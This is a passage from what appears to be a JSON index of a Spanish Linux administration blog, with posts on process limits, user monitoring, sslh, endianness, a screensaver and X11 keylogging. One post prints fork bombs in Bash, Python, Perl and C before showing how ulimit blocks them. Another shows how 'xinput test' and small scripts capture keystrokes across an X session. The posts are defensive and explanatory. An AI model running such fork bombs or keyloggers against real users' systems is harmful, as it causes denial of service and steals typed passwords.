-t) unlimited max user processes (-u) unlimited virtual memory (kbytes, -v) unlimited file locks (-x) unlimited Denegación de servicio Uno de los problemas que podemos encontrar es que el número máximo de procesos no está limitado, por defecto, en algunas distribuciones, entre ellas Ubuntu. Esto hace el equipo vulnerable a un ataque de denegación de servicio (DoS), como por ejemplo una [bomba fork_][bombafork], y a aplicaciones que no están bien programadas o no funcionan correctamente. La vulnerabilidad consiste en que un proceso comienza a crear una gran cantidad de procesos, que consumen tiempo de proceso y memoria, y que saturan la lista de procesos a ejecutar mantenida por el sistema operativo, impidiendo que se ejecuten nuevos programas hasta que no se cierre alguno, provocando que la máquina deje de responder. Un solo usuario podría dejar el sistema sin respuesta. Fuente: Wikipedia En sencillo obtener un programa de este tipo. Algunos ejemplos típicos de bombas fork , en Bash: bash $ :(){ :|:& };: # \":\" es el nombre de la función En Python: ```python import os while True: os.fork() ``` En Perl: perl fork while fork En C: ```c include int main() { while(1) fork(); } ``` Prevención Dado que una vez iniciada la bomba fork es prácticamente imposible crear procesos nuevos y para eliminar los procesos creados por la propia bomba fork se necesita a su vez otra proceso que lo haga, la única solución pasa por el reinicio de la máquina. Sin embargo, podemos prevenir que un ataque de este tipo se apodere de los recursos de la máquina, limitando el número máximo de procesos que se puedan ejecutar por usuario . Podemos especificar un limite para la sesión acutal: bash $ ulimit -u 240 Si ahora lanzamos la bomba fork : bash $ :(){ :|:& };: bash: fork: Recurso no disponible temporalmente ... Podremos eliminar el proceso pulsando Ctrl+C . Para que los cambios tengan efecto permanente, editamos el fichero /etc/security/limits.conf y añadimos la siguiente línea: username hard nproc 240 En el próximo reinicio, o si cerramos todas las sesiones y volvemos a entrar, los cambios tendrán efecto.","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/01/limitando-el-numero-de-procesos-por-usuario/","loc":"https://karpoke.ignaciocano.com/2011/08/01/limitando-el-numero-de-procesos-por-usuario/"},{"title":"Controlando la actividad de los usuarios conectados","text":"Podemos utilizar varios comandos para saber qué usuarios están conectados al sistema , desde cuando y qué están haciendo. También podemos saber cuando se han conectado anteriormente. También podríamos interactuar con los usuarios, enviarles mensajes, matarles procesos, echarlos del sistema, etc, pero ahora nos vamos a centrar en saber cuando entran, cuando salen y qué están haciendo. w Con w podemos saber que usuarios están conectados ahora mismo y que procesos están ejecutando. bash $ w 11:54:16 up 4:04, 3 users, load average: 0,34, 0,12, 0,12 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT karpoke tty1 08:58 9.00s 0.62s 0.50s -bash karpoke tty7 :0 07:51 3:04m 7:08 0.28s gnome-session --session=2d-gnome karpoke pts/0 :0.0 07:51 54.00s 1.18s 0.69s ssh 192.168.50.2 karpoke pts/1 :0.0 08:14 0.00s 1.67s 0.00s w karpoke pts/2 192.168.50.10:S. 08:27 0.00s 0.53s 0.00s /bin/bash karpoke pts/3 192.168.50.10:S. 08:42 3:19 0.28s 0.28s /bin/bash En la cabecera muestra la hora actual, el tiempo que lleva encendida la máquina, el número de usuarios en el sistema y la carga media del último minuto, los últimos 5 minutos y los últimos 15 minutos. Después, para cada conexión de usuario, muestra el nombre de usuario, el terminal al que está conectado, la máquina remota, el tiempo que hace que está conectado, el tiempo que ha estado sin hacer nada, el tiempo usado por los procesos en ejecución, incluyendo procesos en segundo plano, y el tiempo utilizado por el proceso en ejecución, que es el que aparece en la última columna. El terminal al que está conectado el usuario puede ser: un terminal en modo texto, como tty1 . Desde la sesión gráfica podemos cambiar a este tipo de terminal utilizando la combinación de teclas Ctrl+Alt+F<1-6> una terminal gráfico, como tty7 . Es el terminal por defecto cuando iniciamos sesión en Gnome o KDE un emulador de terminal, como pts/0 . Cuando nos conectamos usando gnome-terminal , por ejemplo. Cuando el usuario se conecta desde la propia máquina, en la columna correspondiente a la máquina desde la cual se conecta el usuario aparece el contenido de la variable DISPLAY , si es que está definida. Esta variable está controlada por el servidor de las X y consiste en un nombre de host , que no aparece cuando se refiere a la propia máquina, seguido de dos puntos \":\" y un número de secuencia, que suele ser 0 pero puede variar si hay varias sesiones gráficas conectadas a la misma máquina. Si continua con un punto seguido de un número, se refiere al número de pantalla dentro de la misma sesión gráfica. En el último caso, cuando aparece una IP seguida de dos puntos y una S, quiere decir que el usuario está utilizando screen (o, como en este caso, byobu ). En este caso, la longitud de la IP corta el contenido, ya que después de la S viene una secuencia que indica cada una de las \"ventanas\" abiertas con screen , por ejemplo: 192.168.50.10:S.1 . Podemos iniciar otra sesión gráfica ejecutando en un terminal, debemos ir a un terminal en modo texto libre, por ejemplo, tty1 , pulsando Ctrl+Alt+F1 , iniciamos sesión, y ejecutamos: bash $ startx -- :1 # importante: hay un espacio antes y después de los dos guiones Para acceder a esta nueva sesión gráfica, pulsamos Ctrl+Alt+F8 . Sólo puede haber una sesión gráfica por terminal, por lo que si quisiéramos una más, deberíamos ir tty2 , pulsando Ctrl+Alt+F2 , y ejecutar: bash $ startx -- :2 Para acceder a esta sesión gráfica, pulsamos Ctrl+Alt+F9 . who Con who también podemos saber quién está conectado. bash $ who -a Sistema de arranque 2011-07-27 07:50 `run-level' 2 2011-07-27 07:50 LOGIN tty4 2011-07-27 07:50 1250 id=4 LOGIN tty5 2011-07-27 07:50 1254 id=5 LOGIN tty2 2011-07-27 07:50 1288 id=2 LOGIN tty3 2011-07-27 07:50 1289 id=3 LOGIN tty6 2011-07-27 07:50 1291 id=6 karpoke - tty1 2011-07-27 11:58 00:19 14171 karpoke + tty7 2011-07-27 07:51 antig 3723 (:0) karpoke + pts/0 2011-07-27 07:51 00:01 5965 (:0.0) karpoke + pts/1 2011-07-27 08:14 . 5965 (:0.0) pts/2 2011-07-27 11:07 0 id=/2 term=0 salida=0 Nos muestra la fecha y hora del último arranque del sistema y el nivel de ejecución. Después, en la primera columna, muestra los procesos de login , marcados con la palabra LOGIN, los usuarios que han iniciado sesión y, si no aparece nada, se refiere a los procesos muertos, por ejemplo, si abrimos un terminal y lo cerramos. También muestra el PID del proceso en ejecución y la máquina remota o el DISPLAY correspondiente. El comando tiene varias opciones para mostrar esta información por partes, por ejemplo, el número de usuarios conectados: ```bash $ who -q karpoke karpoke karpoke karpoke usuarios=4 ``` whoami Con whoami podemos saber, única y exclusivamente , cual es nuestro usuario: bash $ whoami karpoke Es equivalente a ejecutar: bash $ id -un id id muestra información de los identificadores de usuarios y grupos: bash $ id uid=1000(user) gid=1000(user) grupos=1000(user),4(adm),7(lp),20(dialout),24(cdrom),29(audio),44(video),46(plugdev),103(fuse),104(lpadmin),112(netdev),115(admin),120(sambashare) Tiene varios argumentos que permiten mostrar sólo cierta información y de diferentes maneras. whowatch whowatch es un monitor interactivo por consola de procesos y usuarios. Muestra información de los usuarios conectados al sistema en tiempo real. Además de la información habitual, como el nombre de usuario, el terminal, la máquina remota o el tipo de conexión, se puede visualizar el árbol de procesos del usuario, e incluso enviarle señales, como SIGINT o SIGKILL, a dichos procesos. Soporta el uso de complementos, hasta 3, que amplíen la información acerca del sistema, de un usuario o de un proceso. ```bash $ whowatch 3 users: (2 local, 0 telnet, 0 ssh, 1 other) load: 0.06, 0.08, 0.31 (gdm-session-w karpoke tty7 :0 - (init) karpoke pts/0 :0.0 - (init) karpoke pts/1 :0.0 - [F1]Help [F9]Menu [ENT]proc all[t]ree [i]dle/cmd [c]md [d]etails [s]ysinfo ``` Pulsando Intro en el usuario conectado que queramos nos muestra información de los procesos que está ejecutando: ``bash 3 users: (2 local, 0 telnet, 0 ssh, 1 other) load: 0.03, 0.07, 0.30 (init) karpoke pts/1 :0.0 6056 - gnome-terminal 6105 |- bash 3135 | - ssh 192.168.50.10 6062 |- gnome-pty-helper 2982 - bash 3845 R - whowatch [ENT]users [c]md all[t]ree [d]etails [o]wner [s]ysinfo sig[l]ist &#94;[K]ILL ``` Podemos ver detalles de un proceso concreto: bash  START: Mon Aug 1 09:11:00 2011  EXE: /usr/bin/ssh  ROOT: /  CWD: /home/karpoke    STATUS:  Uid: 1000 1000 1000 1000  Gid: 1000 1000 1000 1000  FDSize: 256  Groups: 4 7 20 24 29 44 46 103 104 112 115 120 100 VmPeak: 7460 kB  VmSize: 7460 kB  VmLck: 0 kB   < - -> [a]up, [z]down ' Y enviarle una señal: bash  PID 3135 - choose signal and press 'y' to send  ->1 HUP Hangup detected on controlling terminal   2 INT Interrupt from keyboard   3 QUIT Quit from keyboard   4 ILL Illegal Instruction   6 ABRT Abort signal from abort(3)   8 FPE Floating point exception   9 KILL Kill signal   11 SEGV Invalid memory reference   13 PIPE Broken pipe: write to pipe with no read  14 ALRM Timer signal from alarm(2)   15 TERM Termination signal       < - -> [a]up, [z]down ' También podemos consultar información del sistema: bash  BOOT TIME: Mon Aug 1 08:30:18 2011  CPU: 3.6% user 2.1% sys 1.0% nice 93.2% idle  MEMORY:  MemTotal: 4081788 kB  MemFree: 436656 kB  Buffers: 530624 kB  Cached: 1825612 kB  SwapCached: 0 kB  Active: 1777952 kB  Inactive: 1396896 kB  Active(anon): 709296 kB  Inactive(anon): 115352 kB  Active(file): 1068656 kB |  < - -> [a]up, [z]down ' finger finger muestra información acerca de los usuarios del sistema, tal como el nombre de usuario, el nombre real, el terminal al que está conectado y si tiene permisos de escritura, la hora de inicio de sesión, tiempo que ha estado ocioso, información de contacto, si tiene correo y cuando fue la última vez que lo consultó, etc. bash $ finger Login Name Tty Idle Login Time Office Office Phone karpoke karpoke tty7 26 Aug 1 08:31 (:0) karpoke karpoke pts/0 Aug 1 08:32 (:0.0) bash $ finger karpoke Login: karpoke Name: karpoke Directory: /home/karpoke Shell: /bin/bash On since Mon Aug 1 08:31 (CEST) on tty7 from :0 27 minutes 18 seconds idle On since Mon Aug 1 08:32 (CEST) on pts/0 from :0.0 Mail last read Sat Jul 30 14:40 2011 (CEST) No Plan. Antiguamente, se podía acceder a la información de un usuario de forma remota. Hoy en día, el servicio de finger no suele utilizarse, por lo que se limita a mostrar información de nuestra propia máquina. Hay una serie de ficheros que se mostrarán si se encuentran en el directorio del usuario: .plan , .project y .gpgkey . Además, si el fichero ~/.nofinger existe, finger no mostrará información del usuario a ninguna petición remota. last last muestra los último usuarios conectados. Por defecto, busca la información en el fichero /var/log/wtmp . La información se limpia a principios de cada mes. ```bash $ last karpoke pts/1 192.168.50.10 Mon Aug 1 09:11 still logged in wtmp begins Mon Aug 1 09:11:04 2011 ``` Cuando tengamos muchas entradas, una opción interesante sería mostrar el listado en orden inverso: ```bash $ last | tac wtmp begins Mon Aug 1 09:11:04 2011 karpoke pts/1 192.168.50.10 Mon Aug 1 09:11 still logged in ``` lastlog lastlog muestra la última conexión de los usuario del sistema. Permite especificar un rango de fechas o un usuario concreto. El orden es el mismo en el que aparecen en /etc/passwd . bash $ lastlog -t 1000 Username Port From Latest root tty2 dom nov 1 13:40:34 +0100 2009 karpoke pts/1 192.168.50.10 lun ago 1 09:11:04 +0200 2011 El contenido lo lee del fichero binario /var/log/lastlog . acct acct muestra el tiempo de conexión en horas basándose en el fichero /var/log/wtmp . Permite múltiples opciones, como el tiempo total por día o por usuario. También muestra el total global. bash $ ac -d Today total 0.24 bash $ ac -p karpoke 0.25 total 0.25 El tiempo se expresa en horas en formato decimal, pero podemos convertirlo fácilmente a sexagesimal : bash $ ac -d | awk '{h=int($NF); m=($NF-h)*60; s=int((m-int(m))*60); m=int(m); print $0\" = \"h\"h \"m\"m \"s\"s \"}' Today total 0.31 = 0h 18m 36s","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/08/01/controlando-la-actividad-de-los-usuarios-conectados/","loc":"https://karpoke.ignaciocano.com/2011/08/01/controlando-la-actividad-de-los-usuarios-conectados/"},{"title":"sslh, compartiendo el puerto 443","text":"Podemos tener varios motivos para tener escuchando nuestro servicio de SSH en el puerto 443. Ya sea porque queremos evitarnos los continuos intentos de conexión que sufrimos por tener el servicio escuchando en el puerto 22 o porque desde donde estemos, ya sea en el trabajo o en un hotel, no estén permitidas las conexiones que no sean al puerto 80 o 443. Pero, ¿y si ya tenemos un servidor web escuchando en el puerto 443? Mediante sslh se puede multiplexar la conexión al puerto 443, de tal forma que dependiendo del protocolo utilizado para conectarnos reenvíe la conexión al puerto 22 si es SSH o al 443 si es SSL. La detección del protocolo se basa en los primeros bytes enviados por el cliente. Las conexiones SSH empiezan con la identificación del cliente utilizando la cadena \"SSH-2.0\", dependiendo de la versión. Los clientes OpenVPN cmoienzan con 0x00 0x0D 0x38. Hay dos tipos de clientes SSH, los que esperan que sea el servidor el primero que envíe su versión ( shy client ) y los que son ellos los que la envían primero ( bold client ). sslh espera un tiempo para recibir la versión de SSH. Si transcurrido ese tiempo no ha recibido nada, asume que es un \"cliente tímido\" y se realiza la conexión con el servidor SSH. Si el cliente envía un paquete antes, sslh lo lee y se lo envía al servidor SSH o SSL, según corresponda. Uno de los inconvenientes de sslh es que tanto el servidor de SSH como el servidor web no ven la IP original, ya que la conexión se redirecciona desde sslh . Para poder limitar el acceso, sslh se puede compilar para que compruebe las listas de acceso definidas en /etc/hosts.allow y /etc/hosts.deny . Instalación desde los respositorios de Ubuntu Lucid Lynx Lo podemos instalar desde los respositorios. Es Ubuntu Lucid Lynx está la versión 1.6i-4: bash $ sudo aptitude install sslh Al principio, se encuentra desactivado, para obligarnos a leer la documentación. Después de echarle un ojo a la página del man , podemos configurarlo editando el fichero /etc/default/sslh : DAEMON_OPTS=\"-u sslh -p 0.0.0.0:443 -s 127.0.0.1:22 -l 127.0.0.1:1443 -P /var/run/sslh.pid\" RUN=yes Estas opciones indican que el servicio se ejecutará como el usuario sslh , escuchando en todas las interfaces en el puerto 443, y redireccionará las conexiones SSH al puerto 22 de la máquina local, y las conexiones SSL al puerto 1443 de la máquina local. El archivo que contiene el PID del servicio es /var/run/sslh.pid . Para que pueda ejecutarse, debemos añadir la última línea, RUN=yes . Instalación desde el código fuente Ahora mismo van por la versión 1.9, así que en lugar de instalarlo desde los repositorios, lo haremos desde el código fuente: bash $ wget http://www.rutschle.net/tech/sslh-1.9.tar.gz $ tar xzvf sslh-1.9.tar.gz $ cd sslh-1.9/ Si queremos compilar con la opción de que se comprueben las listas de acceso, deberemos realizar un par de acciones previas al make install : bash $ sudo aptitude install libwrap0{,-dev} tcpd $ sed -i 's/USELIBWRAP=./USELIBWRAP=1/' Makefile Ahora ya podemos pasar a la instalación: bash $ sudo make install $ sudo make install-debian Editamos el fichero /etc/default/sslh para configurar las interfaces. Para evitar que haya cualquier tipo de colisión entre openssh , apache2 y sslh , debemos asegurarnos de que no escuchan en el mismo puerto o que lo hacen en interfaces diferentes. En la interfaz en la que escucha sslh podríamos poner nuestra IP pública, si fuese fija. Sino, lo más cómodo será cambiar el puerto en el que escucha apache2 para las conexiones seguras: LISTEN=0.0.0.0:443 SSH=localhost:22 SSL=localhost:1443 Configurar apache2 Antes de reiniciar el servicio sslh , deberemos modificar la configuración de Apache para que no haya conflicto entre las interfaces. En el fichero /etc/apache2/ports.conf cambiamos el número de puerto en el que escucha para las conexiones seguras : Listen 1443 # formerly 443 No olvidemos cambiarlo también en la configuración del VirtualHost , por ejemplo en /etc/apache2/sites-available/default-ssl . Ahora, reiniciamos ambos servicios: bash $ sudo service sslh start $ sudo service apache2 restart Ya podemos probarlo. bash $ w3m https://mydomain.com $ ssh -p443 mydomain.com En los logs , /var/log/syslog , podremos ver algo como: Jul 30 19:38:00 terminus sslh[25196]: connection from 1.2.3.4:42711 forwarded to SSL Jul 30 19:38:01 terminus sslh[25196]: connection from 1.2.3.4:42712 forwarded to SSL Jul 30 19:39:01 terminus sslh[25196]: connection from 1.2.3.4:43923 forwarded to SSH logcheck nos alerta de cada conexión redirigida Si tenemos instalado logcheck y no queremos que nos lleguen estos avisos cada vez, podemos crear el archivo /etc/logcheck/ignore.d.server/sslh e incluir la siguiente línea: bash &#94;\\w{3} [ :[:digit:]]{11} [._[:alnum:]-]+ sslh\\[[[:digit:]]+\\]: connection from [:.[:xdigit:]]+ forwarded to SS(L|H)$ ¿Y el cortafuegos? Si, por ejemplo, utilizamos ufw , podemos modificar la regla para permitir las conexiones al puerto 22 únicamente desde la propia LAN: bash $ sudo ufw allow proto tcp from 192.168.50.0/24 to any port 22 También podemos borrar la regla antigua: bash $ sudo ufw delete allow tcp/22","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/30/sslh-compartiendo-el-puerto-443/","loc":"https://karpoke.ignaciocano.com/2011/07/30/sslh-compartiendo-el-puerto-443/"},{"title":"Endianness","text":"\" Endianicidad \" designa el formato en el que se almacenan los datos de más de un byte en un ordenador. El sistema big-endian adoptado por Motorola entre otros, consiste en representar los bytes en el orden \"natural\", así el valor hexadecimal 0x4A3B2C1D se codificaría en memoria en la secuencia {4A, 3B, 2C, 1D}. En el sistema little-endian adoptado por Intel, entre otros, el mismo valor se codificaría como {1D, 2C, 3B, 4A}, de manera que de este modo se hace más intuitivo el acceso a datos, porque se efectúa fácilmente de manera incremental de menos relevante a más relevante (siempre se opera con incrementos de contador en la memoria). Algunas arquitecturas de microprocesador pueden trabajar con ambos formatos (ARM, PowerPC, DEC Alpha, PA-RISC, Arquitectura MIPS), y a veces son referidas como sistemas middle-endian . Comprobación en C Una posible forma de comprobar qué sistema utilizamos mediante un programa en C es con el siguiente código: ```c include int main(int argc, char argv) { int i = 1; char p = (char ) &i if ( p[0] == 1 ) printf(\"Little Endian\\n\"); else printf(\"Big Endian\\n\"); return 0; } ``` Se obtiene la dirección de memoria de un entero, con un espacio de almacenamiento de al menos 16 bits, cuyo valor es 1. Leemos el primer byte y si es 1 es que little-endian . Para leer el primer byte del entero, hacemos una conversión de tipo puntero a carácter. Comprobación en Bash El siguiente comando utiliza el caracter ASCII \"I\" , cuyo valor en octal en sistemas little-endian es 000111, mientras que en sistemas big-endian es 0444000. Basta comprobar el último carácter para conocer el tipo de sistema. Si es 1 es que utilizamos little-endian : bash $ echo -n I | od -to2 | head -n1 | cut -f2 -d\" \" | cut -c6 1 También podemos utilizar awk : bash $ awk 'BEGIN {c=\"I\"; printf \"%c\",c}' | od | head -n1 | cut -f2 -d\" \" | cut -c6 1 Comprobación en Python Utilizando el método pack : ```bash $ python -c \"from struct import pack;print(int(pack('@h',1)==pack(' Consultando la propiedad byteorder: $ python -c \"import sys;print sys.byteorder\" little $ python -c \"import sys;print(0 if sys.byteorder=='big' else 1)\" 1 ``` Comprobación en Perl El resultado haciendo la comprobación en Perl es 1234 para little-endian . bash $ perl -MConfig -e 'print \"$Config{byteorder}\\n\";' 1234 También se puede utilizar la función pack : bash $ perl -MConfig -e 'print pack(\"L\", 1) ne pack(\"N\", 1);' 1","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/30/endianness/","loc":"https://karpoke.ignaciocano.com/2011/07/30/endianness/"},{"title":"Salvapantallas con el código fuente del kernel","text":"Si queremos que cada vez que aparezca el salvapantallas, lo haga mostrando algunas líneas del código fuente del kernel por pantalla, sólo necesitamos configurar el salvapantallas phosphor . Lo primero es instalar el código fuente del kernel : bash $ sudo apt-get source linux-source-$(uname -r) El comando uname muestra información acerca del sistema operativo instalado, la versión del kernel, la familia del procesador, el nombre de la máquina o la plataforma. En mi caso, uso un kernel PAE, porque tengo una Ubuntu de 32 bits y 4 GB de RAM, por lo que el comando anterior no me ha ido del todo bien: bash $ uname -r 2.6.38-10-generic-pae Así que, en su lugar, he utilizado: bash $ sudo apt-get source linux-2.6.38 Una vez descargado el código fuente del kernel, configuraremos phosphor para que muestre el contenido de algún fichero. Si no tenemos instalado phosphor , habrá que instalar el paquete xscreensaver-data-extra . El fichero de configuración de phosphor está en /usr/share/applications/screensavers/phosphor.desktop : bash [Desktop Entry] Name=Phosphor Exec=/usr/lib/xscreensaver/phosphor -root TryExec=/usr/lib/xscreensaver/phosphor Comment=Draws a simulation of an old terminal, with large pixels and long-sustain phosphor. On X11 systems, This program is also a fully-functional VT100 emulator! Written by Jamie Zawinski. StartupNotify=false Terminal=false Type=Application Categories=Screensaver; OnlyShowIn=GNOME; Para probarlo podemos ejecutar: bash $ /usr/lib/xscreensaver/phosphor -program fortune $ /usr/lib/xscreensaver/phosphor -scale 2 -delay 40000 -ticks 10 -geom '1680x1050' -program 'od -txC -w6 /dev/random' Podemos pasarle diferentes opciones, tales como el tipo, el tamaño o la escala de la fuente a utilizar, la velocidad a la que escribe, el programa del cual debe recoger el texto, etc. Crearemos un pequeño script , random-lines-of-code.sh , que permita seleccionar un trozo aleatorio de un fichero aleatorio del código fuente del kernel; ```bash function randint() { cat /proc/interrupts | md5sum | sed -r 's/[a-f]//g; s/&#94;0+//; s/.{3}$//' } random file f=$(ls /usr/src/linux-2.6.38/ / .{c,h} | shuf -n1) number of lines declare -i nol=$(wc -l $f | awk '{print $1}') choose a random first line declare -i first=$( echo $(randint) % $nol | bc ) choose a random bunch of lines declare -i offset= \\(( echo $(randint) % \\(\\) nol-$first) | bc ) first line doesn't start at 0 first=$(( first+1 )) last line declare -i last=$(( first+offset )) show the lines of the file cat \\(f | sed -n ${first},\\) {last}p ``` Guardamos el script , le damos permisos de ejecución y modificamos el fichero de configuración de phosphor para que lo ejecute. Cambiamos la línea del Exec : bash Exec=/usr/lib/xscreensaver/phosphor -root -scale 2 -program '/home/user/random-lines-of-code.sh' En el menú Sistema > Preferencias > Salvapantallas seleccionamos Phosphor , y listos. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2011/07/28/salvapantallas-con-el-codigo-fuente-del-kernel/","loc":"https://karpoke.ignaciocano.com/2011/07/28/salvapantallas-con-el-codigo-fuente-del-kernel/"},{"title":"¿Un keylogger en Ubuntu?","text":"El comando xinput permite configurar y probar dispositivos de entrada para las XWindow. Podemos obtener un listado de los dispositivos de entrada: bash $ xinput list ⎡ Virtual core pointer id=2 [master pointer (3)] ⎜ ↳ Virtual core XTEST pointer id=4 [slave pointer (2)] ⎜ ↳ SynPS/2 Synaptics TouchPad id=15 [slave pointer (2)] ⎣ Virtual core keyboard id=3 [master keyboard (2)] ↳ Virtual core XTEST keyboard id=5 [slave keyboard (3)] ↳ Power Button id=6 [slave keyboard (3)] ↳ Video Bus id=7 [slave keyboard (3)] ↳ Power Button id=8 [slave keyboard (3)] ↳ Sleep Button id=9 [slave keyboard (3)] ↳ Laptop_Integrated_Webcam_2M id=10 [slave keyboard (3)] ↳ AT Translated Set 2 keyboard id=11 [slave keyboard (3)] ↳ Dell WMI hotkeys id=13 [slave keyboard (3)] También podemos obtener más información de algún dispositivo en concreto, por ejemplo, del teclado, cuyo identificador, en mi caso, es el 11: bash $ xinput list --long 11 AT Translated Set 2 keyboard id=11 [slave keyboard (3)] Reporting 1 classes: Class originated from: 11 Keycodes supported: 248 También podemos probar el teclado: bash $ xinput test 11 key release 36 key press 45 kkey release 45 key press 38 akey release 38 key press 27 rkey release 27 key press 33 pkey release 33 key press 32 okey release 32 key press 45 kkey release 45 key press 26 ekey release 26 Y el touchpad : bash $ xinput test 12 motion a[0]=2565 a[1]=3570 motion a[0]=2568 a[1]=3568 motion a[0]=2571 a[1]=3567 motion a[0]=2573 a[1]=3567 motion a[0]=2575 a[1]=3568 Todas las teclas que pulsemos, estemos o no en el terminal, aparecen en el terminal. Esto se debe a que : XWindows no implementa ningún mecanismo de aislamiento entre aplicaciones que pertenecen a la misma sesión X y, por tanto, una aplicación con acceso a la sesión puede monitorizar las teclas pulsadas, o los movimientos de ratón. En principio, sólo será un problema si algún programa que utilicemos está comprometido o es malicioso. Para aprovechar xinput como keylogger es necesario tener acceso a la sesión X. Utilizando AppArmor se puede reducir el riesgo, haciendo más difícil instalar un keylogger de forma permanente. Sin embargo, no puede evitar que una aplicación registre las pulsaciones de teclado, y si ésta tiene acceso a internet, podría enviarlas a un servidor remoto. SELinux podría solucionar el problema. Sin embargo, las extensiones XSELinux no se cargan por defecto, no todas tienen una madurez para incluirlas en un entorno de producción, ni cuales pueden interferir negativamente en otras aplicaciones. Esta potencial vulnerabilidad podría ser aprovechada, por ejemplo, por: este script en Perl &#94;[ 1 ]&#94;, que hace más sencillo reconocer qué teclas se están pulsando: bash $ perl keylog2.pl Keyboard ID: 11 Watching `xinput test 11` k(shift key: 0) [45] press: k (shift key: 0) [45] release: k a(shift key: 0) [38] press: a (shift key: 0) [38] release: a r(shift key: 0) [27] press: r (shift key: 0) [27] release: r p(shift key: 0) [33] press: p (shift key: 0) [33] release: p o(shift key: 0) [32] press: o (shift key: 0) [32] release: o k(shift key: 0) [45] press: k (shift key: 0) [45] release: k e(shift key: 0) [26] press: e (shift key: 0) [26] release: e [105] press: {Ctrl} &#94;C este programa en C++ , ```bash $ g++ -lX11 keylogger.cpp -o keylogger $ ./keylogger Keylogger started Info about X11 connection: The display is:::0.0 Width::1680 Height::1050 Connection number is 3 You've got a coloured monitor with depth of 24 Logging started. 1311301288.99731492996215820312: 36 k1311301290.27069497108459472656: 45 1311301290.30860710144042968750: 45 a1311301290.34145402908325195312: 38 1311301290.37259697914123535156: 38 1311301290.40374803543090820312: 27 1311301290.40377688407897949219: 38 r1311301290.43391704559326171875: 27 1311301290.43394398689270019531: 38 1311301290.46408295631408691406: 27 1311301290.46410894393920898438: 33 p1311301290.49424099922180175781: 27 1311301290.49426794052124023438: 32 33 o1311301290.52452206611633300781: 32 33 k1311301290.55576109886169433594: 32 33 1311301290.55580902099609375000: 45 1311301290.58594703674316406250: 32 1311301290.58597397804260253906: 45 1311301290.61610102653503417969: 45 e1311301290.67649888992309570312: 26 1311301290.71751308441162109375: 26 1311301291.60019397735595703125: 105 &#94;C ``` o este proyecto, iXKeyLog , 1 El script en Perl utiliza el módulo IO::Pty::Easy , y para poder probarlo en Ubuntu, no basta con la librería libio-pty-perl que hay en los respositorios, necesitaremos instalar el módulo de CPAN .","tags":"hack","url":"https://karpoke.ignaciocano.com/2011/07/22/un-keylogger-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2011/07/22/un-keylogger-en-ubuntu/"},{"title":"Instalar módulos de CPAN usando CPAN","text":"Una de las razones para querer instalar módulos del repositorio CPAN de Perl utilizando, a su vez, el módulo cpan , es que los módulos están más actualizados que en los paquetes de los repositorios. Para conseguirlo, podemos seguir los siguientes pasos Necesitamos tener instalado el paquete build-essential . Lanzamos la consola CPAN, con privilegios de administrador : bash $ sudo perl -MCPAN -e shell o también podríamos ejecutar: bash $ sudo cpan Si no tuviéramos permisos, parece que también es posible instalar módulos de Perl sin tener privilegios de administrador , mediante el módulo local::lib . Una vez en la consola CPAN, el comando help nos muestra información acerca de varios comandos disponibles. ```bash cpan> help Display Information (ver 1.9600) command argument description a,b,d,m WORD or /REGEXP/ about authors, bundles, distributions, modules i WORD or /REGEXP/ about any of the above ls AUTHOR or GLOB about files in the author's directory (with WORD being a module, bundle or author name or a distribution name of the form AUTHOR/DISTRIBUTION) Download, Test, Make, Install... get download clean make clean make make (implies get) look open subshell in dist directory test make test (implies make) readme display these README files install make install (implies test) perldoc display POD documentation Upgrade r WORDs or /REGEXP/ or NONE report updates for some/matching/all modules upgrade 